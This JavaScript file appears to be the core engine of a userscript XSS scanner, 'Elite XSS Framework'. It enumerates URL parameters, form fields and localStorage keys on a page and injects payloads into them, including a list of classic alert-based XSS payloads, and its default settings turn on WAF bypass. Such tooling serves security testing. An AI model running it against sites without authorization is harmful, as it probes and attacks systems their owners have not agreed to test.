/**
 * Elite XSS Framework v8.0 - Core Testing Engine
 * The heart of the framework - coordinates all testing operations
 */

(function(exports, FRAMEWORK, GM_getValue, GM_setValue, GM_deleteValue, GM_notification, unsafeWindow) {
  'use strict';

  const Engine = {
    // Engine state
    state: {
      running: false,
      paused: false,
      sessionId: null,
      startTime: null,
      testsExecuted: 0,
      vulnerabilitiesFound: 0,
      currentEndpoint: null,
      testQueue: [],
      activeWorkers: new Set()
    },

    // Performance metrics
    metrics: {
      totalTests: 0,
      successfulTests: 0,
      failedTests: 0,
      avgTestTime: 0,
      testsPerSecond: 0,
      lastTestTime: 0
    },

    /**
     * Initialize the testing engine
     */
    init: () => {
      Engine.state.sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      
      // Register event listeners
      Engine.registerEventListeners();
      
      // Initialize performance monitoring
      Engine.startPerformanceMonitoring();
      
      console.log('[Engine] Initialized with session:', Engine.state.sessionId);
      
      return {
        success: true,
        sessionId: Engine.state.sessionId
      };
    },

    /**
     * Start a new testing session
     */
    start: async (config = {}) => {
      if (Engine.state.running) {
        return {
          success: false,
          error: 'Engine already running'
        };
      }

      try {
        console.log('[Engine] Starting testing session...');
        
        Engine.state.running = true;
        Engine.state.paused = false;
        Engine.state.startTime = Date.now();
        Engine.state.testsExecuted = 0;
        Engine.state.vulnerabilitiesFound = 0;

        // Validate configuration
        const validatedConfig = await Engine.validateConfig(config);
        
        // Discover endpoints
        console.log('[Engine] Discovering endpoints...');
        const endpoints = await Engine.discoverEndpoints(validatedConfig);
        
        if (endpoints.length === 0) {
          throw new Error('No testable endpoints discovered');
        }

        console.log(`[Engine] Found ${endpoints.length} testable endpoints`);

        // Load payloads
        console.log('[Engine] Loading payloads...');
        const payloads = await Engine.loadPayloads(endpoints, validatedConfig);
        
        console.log(`[Engine] Loaded ${payloads.totalCount} payloads`);

        // Build test queue
        console.log('[Engine] Building test queue...');
        Engine.state.testQueue = Engine.buildTestQueue(endpoints, payloads, validatedConfig);
        
        console.log(`[Engine] Test queue ready: ${Engine.state.testQueue.length} tests`);

        // Initialize detection hooks
        console.log('[Engine] Initializing detection hooks...');
        await Engine.initializeDetection();

        // Start test execution
        console.log('[Engine] Starting test execution...');
        Engine.executeTests(validatedConfig);

        // Broadcast start event
        Engine.broadcastEvent('test_started', {
          sessionId: Engine.state.sessionId,
          endpoints: endpoints.length,
          totalTests: Engine.state.testQueue.length,
          timestamp: Date.now()
        });

        return {
          success: true,
          sessionId: Engine.state.sessionId,
          endpointsCount: endpoints.length,
          totalTests: Engine.state.testQueue.length
        };

      } catch (error) {
        console.error('[Engine] Start failed:', error);
        Engine.state.running = false;
        
        return {
          success: false,
          error: error.message
        };
      }
    },

    /**
     * Stop the testing session
     */
    stop: () => {
      if (!Engine.state.running) {
        return { success: false, error: 'Engine not running' };
      }

      console.log('[Engine] Stopping testing session...');
      
      Engine.state.running = false;
      Engine.state.testQueue = [];
      
      // Calculate final metrics
      const duration = Date.now() - Engine.state.startTime;
      const finalMetrics = {
        ...Engine.metrics,
        duration: duration,
        testsExecuted: Engine.state.testsExecuted,
        vulnerabilitiesFound: Engine.state.vulnerabilitiesFound
      };

      // Cleanup detection hooks
      Engine.cleanupDetection();

      // Broadcast stop event
      Engine.broadcastEvent('test_stopped', {
        sessionId: Engine.state.sessionId,
        metrics: finalMetrics,
        timestamp: Date.now()
      });

      console.log('[Engine] Session stopped. Metrics:', finalMetrics);

      return {
        success: true,
        metrics: finalMetrics
      };
    },

    /**
     * Pause the testing session
     */
    pause: () => {
      if (!Engine.state.running || Engine.state.paused) {
        return { success: false };
      }

      Engine.state.paused = true;
      
      Engine.broadcastEvent('test_paused', {
        sessionId: Engine.state.sessionId,
        timestamp: Date.now()
      });

      return { success: true };
    },

    /**
     * Resume the testing session
     */
    resume: () => {
      if (!Engine.state.running || !Engine.state.paused) {
        return { success: false };
      }

      Engine.state.paused = false;
      
      Engine.broadcastEvent('test_resumed', {
        sessionId: Engine.state.sessionId,
        timestamp: Date.now()
      });

      // Continue test execution
      Engine.executeTests();

      return { success: true };
    },

    /**
     * Validate and normalize configuration
     */
    validateConfig: async (config) => {
      // Merge with defaults from EliteConfig
      const defaults = {
        maxConcurrentTests: 5,
        testDelay: 1000,
        timeout: 10000,
        retryAttempts: 2,
        enableAdvancedTechniques: true,
        enableWafBypass: true,
        enableBlindXss: false,
        safeMode: false,
        targetEndpoints: [],
        excludeEndpoints: [],
        payloadTypes: ['base', 'advanced', 'polyglot'],
        contextAware: true,
        mutationFuzzing: true,
        encodingSchemes: ['none', 'url', 'html', 'unicode', 'base64'],
        maxPayloadsPerEndpoint: 100
      };

      return { ...defaults, ...config };
    },

    /**
     * Discover all testable endpoints
     */
    discoverEndpoints: async (config) => {
      if (!unsafeWindow.EliteEndpointDiscovery) {
        // Fallback: basic endpoint discovery
        return Engine.basicEndpointDiscovery();
      }

      return await unsafeWindow.EliteEndpointDiscovery.discover(config);
    },

    /**
     * Basic endpoint discovery fallback
     */
    basicEndpointDiscovery: () => {
      const endpoints = [];

      // URL parameters
      const urlParams = new URLSearchParams(window.location.search);
      urlParams.forEach((value, key) => {
        endpoints.push({
          id: `url_${key}_${Date.now()}`,
          type: 'url_parameter',
          name: key,
          value: value,
          context: 'url',
          risk: 'high',
          testable: true
        });
      });

      // Form inputs
      document.querySelectorAll('input, textarea').forEach((elem, idx) => {
        const name = elem.name || elem.id || `input_${idx}`;
        endpoints.push({
          id: `form_${name}_${idx}`,
          type: 'form_input',
          name: name,
          value: elem.value,
          element: elem,
          context: 'html',
          risk: 'high',
          testable: true
        });
      });

      // localStorage items
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          endpoints.push({
            id: `ls_${key}`,
            type: 'local_storage',
            name: key,
            value: localStorage.getItem(key),
            context: 'storage',
            risk: 'medium',
            testable: true
          });
        }
      } catch (e) {}

      return endpoints;
    },

    /**
     * Load payloads for discovered endpoints
     */
    loadPayloads: async (endpoints, config) => {
      const payloadManager = unsafeWindow.ElitePayloadManager;
      
      if (!payloadManager) {
        // Fallback: basic payloads
        return {
          payloads: Engine.getBasicPayloads(),
          totalCount: 10
        };
      }

      return await payloadManager.load(endpoints, config);
    },

    /**
     * Basic payload fallback
     */
    getBasicPayloads: () => {
      return [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>'
      ];
    },

    /**
     * Build the test queue from endpoints and payloads
     */
    buildTestQueue: (endpoints, payloads, config) => {
      const queue = [];
      let testId = 0;

      endpoints.forEach(endpoint => {
        if (!endpoint.testable) return;

        // Get payloads for this endpoint type
        const endpointPayloads = payloads.byType?.[endpoint.type] || payloads.payloads || Engine.getBasicPayloads();
        
        const limit = Math.min(endpointPayloads.length, config.maxPayloadsPerEndpoint);

        for (let i = 0; i < limit; i++) {
          const payload = endpointPayloads[i];
          
          queue.push({
            id: `test_${testId++}`,
            endpoint: endpoint,
            payload: payload,
            marker: `ELITE_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            status: 'pending',
            attempts: 0,
            priority: Engine.calculatePriority(endpoint, payload),
            timestamp: Date.now()
          });
        }
      });

      // Sort by priority if smart scheduling enabled
      if (config.enableAdvancedTechniques) {
        queue.sort((a, b) => b.priority - a.priority);
      }

      return queue;
    },

    /**
     * Calculate test priority
     */
    calculatePriority: (endpoint, payload) => {
      let priority = 50;

      // Endpoint risk
      if (endpoint.risk === 'critical') priority += 40;
      else if (endpoint.risk === 'high') priority += 25;
      else if (endpoint.risk === 'medium') priority += 10;

      // Payload complexity (simpler = higher priority)
      priority += Math.max(0, 20 - (payload.length / 10));

      // Context-specific boost
      if (endpoint.context === 'javascript') priority += 15;
      else if (endpoint.context === 'html') priority += 10;

      return Math.round(priority);
    },

    /**
     * Initialize detection hooks
     */
    initializeDetection: async () => {
      if (unsafeWindow.EliteDetection) {
        return await unsafeWindow.EliteDetection.initialize();
      }
      
      // Basic detection fallback
      console.log('[Engine] Using basic detection hooks');
      return { success: true };
    },

    /**
     * Cleanup detection hooks
     */
    cleanupDetection: () => {
      if (unsafeWindow.EliteDetection) {
        unsafeWindow.EliteDetection.cleanup();
      }
    },

    /**
     * Execute tests from the queue
     */
    executeTests: async (config) => {
      const maxConcurrent = config?.maxConcurrentTests || 5;
      
      while (Engine.state.running && Engine.state.testQueue.length > 0) {
        // Check if paused
        if (Engine.state.paused) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          continue;
        }

        // Get next batch of tests
        const batch = [];
        while (batch.length < maxConcurrent && Engine.state.testQueue.length > 0) {
          batch.push(Engine.state.testQueue.shift());
        }

        // Execute batch in parallel
        const results = await Promise.allSettled(
          batch.map(test => Engine.executeTest(test, config))
        );

        // Process results
        results.forEach((result, idx) => {
          if (result.status === 'fulfilled') {
            Engine.handleTestResult(result.value);
          } else {
            Engine.handleTestError(batch[idx], result.reason);
          }
        });

        // Delay before next batch
        if (config?.testDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, config.testDelay));
        }
      }

      // All tests completed
      if (Engine.state.running) {
        Engine.stop();
      }
    },

    /**
     * Execute a single test
     */
    executeTest: async (test, config) => {
      const startTime = Date.now();
      
      try {
        console.log(`[Engine] Testing: ${test.endpoint.name} with payload: ${test.payload.substring(0, 50)}...`);

        // Register marker for detection
        if (unsafeWindow.EliteDetection) {
          unsafeWindow.EliteDetection.registerMarker(test.marker, test.payload, test.endpoint);
        }

        // Inject payload
        let injectionResult;
        if (unsafeWindow.EliteInjection) {
          injectionResult = await unsafeWindow.EliteInjection.inject(test.endpoint, test.payload, test.marker, config);
        } else {
          // Basic injection fallback
          injectionResult = Engine.basicInject(test.endpoint, test.payload);
        }

        if (!injectionResult.success) {
          throw new Error(injectionResult.error || 'Injection failed');
        }

        // Wait for detection
        await new Promise(resolve => setTimeout(resolve, config?.timeout || 3000));

        // Check for vulnerability
        let detected = false;
        if (unsafeWindow.EliteDetection) {
          detected = unsafeWindow.EliteDetection.checkMarker(test.marker);
        }

        const duration = Date.now() - startTime;

        return {
          ...test,
          status: detected ? 'vulnerable' : 'safe',
          detected: detected,
          duration: duration,
          timestamp: Date.now()
        };

      } catch (error) {
        console.error(`[Engine] Test failed:`, error);
        
        return {
          ...test,
          status: 'error',
          error: error.message,
          duration: Date.now() - startTime
        };
      }
    },

    /**
     * Basic injection fallback
     */
    basicInject: (endpoint, payload) => {
      try {
        switch (endpoint.type) {
          case 'url_parameter':
            const url = new URL(window.location.href);
            url.searchParams.set(endpoint.name, payload);
            window.location.href = url.toString();
            return { success: true };

          case 'form_input':
            if (endpoint.element) {
              endpoint.element.value = payload;
              endpoint.element.dispatchEvent(new Event('input', { bubbles: true }));
              endpoint.element.dispatchEvent(new Event('change', { bubbles: true }));
              return { success: true };
            }
            return { success: false, error: 'Element not found' };

          case 'local_storage':
            localStorage.setItem(endpoint.name, payload);
            return { success: true };

          default:
            return { success: false, error: 'Unknown endpoint type' };
        }
      } catch (error) {
        return { success: false, error: error.message };
      }
    },

    /**
     * Handle test result
     */
    handleTestResult: (result) => {
      Engine.state.testsExecuted++;
      
      if (result.status === 'vulnerable') {
        Engine.state.vulnerabilitiesFound++;
        
        console.log(`🎯 [Engine] VULNERABILITY FOUND: ${result.endpoint.name}`);
        
        // Broadcast vulnerability event
        Engine.broadcastEvent('vulnerability_found', result);
        
        // Show notification
        GM_notification({
          text: `Endpoint: ${result.endpoint.name}\nPayload: ${result.payload.substring(0, 50)}...`,
          title: '🎯 Vulnerability Found',
          timeout: 5000
        });
      }

      // Update metrics
      Engine.updateMetrics(result);

      // Broadcast progress
      Engine.broadcastEvent('test_progress', {
        testsExecuted: Engine.state.testsExecuted,
        vulnerabilitiesFound: Engine.state.vulnerabilitiesFound,
        queueRemaining: Engine.state.testQueue.length
      });
    },

    /**
     * Handle test error
     */
    handleTestError: (test, error) => {
      console.error(`[Engine] Test error for ${test.endpoint.name}:`, error);
      
      test.attempts++;
      
      // Retry logic
      if (test.attempts < 3) {
        Engine.state.testQueue.push(test);
      } else {
        Engine.metrics.failedTests++;
      }
    },

    /**
     * Update performance metrics
     */
    updateMetrics: (result) => {
      Engine.metrics.totalTests++;
      
      if (result.status === 'vulnerable') {
        Engine.metrics.successfulTests++;
      } else if (result.status === 'error') {
        Engine.metrics.failedTests++;
      }

      // Calculate average test time
      const alpha = 0.2; // Exponential moving average factor
      Engine.metrics.avgTestTime = alpha * result.duration + (1 - alpha) * Engine.metrics.avgTestTime;

      // Calculate tests per second
      const elapsed = (Date.now() - Engine.state.startTime) / 1000;
      Engine.metrics.testsPerSecond = Engine.state.testsExecuted / elapsed;
    },

    /**
     * Start performance monitoring
     */
    startPerformanceMonitoring: () => {
      setInterval(() => {
        if (Engine.state.running) {
          Engine.broadcastEvent('metrics_update', Engine.metrics);
        }
      }, 2000);
    },

    /**
     * Register event listeners
     */
    registerEventListeners: () => {
      // Listen for cross-tab events
      if (unsafeWindow.EliteSync) {
        unsafeWindow.EliteSync.on('test_command', (command) => {
          if (command.action === 'stop') {
            Engine.stop();
          } else if (command.action === 'pause') {
            Engine.pause();
          } else if (command.action === 'resume') {
            Engine.resume();
          }
        });
      }
    },

    /**
     * Broadcast event to all components
     */
    broadcastEvent: (eventType, data) => {
      // Broadcast via sync system
      if (unsafeWindow.EliteSync) {
        unsafeWindow.EliteSync.broadcast(eventType, data);
      }

      // Dispatch custom event
      window.dispatchEvent(new CustomEvent(`elite:${eventType}`, { detail: data }));
    },

    /**
     * Get current state
     */
    getState: () => {
      return {
        ...Engine.state,
        metrics: Engine.metrics,
        progress: Engine.state.testQueue.length > 0 
          ? (Engine.state.testsExecuted / (Engine.state.testsExecuted + Engine.state.testQueue.length)) * 100
          : 100
      };
    }
  };

  // Export the engine
  exports.init = Engine.init;
  exports.start = Engine.start;
  exports.stop = Engine.stop;
  exports.pause = Engine.pause;
  exports.resume = Engine.resume;
  exports.getState = Engine.getState;

})(exports, FRAMEWORK, GM_getValue, GM_setValue, GM_deleteValue, GM_notification, unsafeWindow);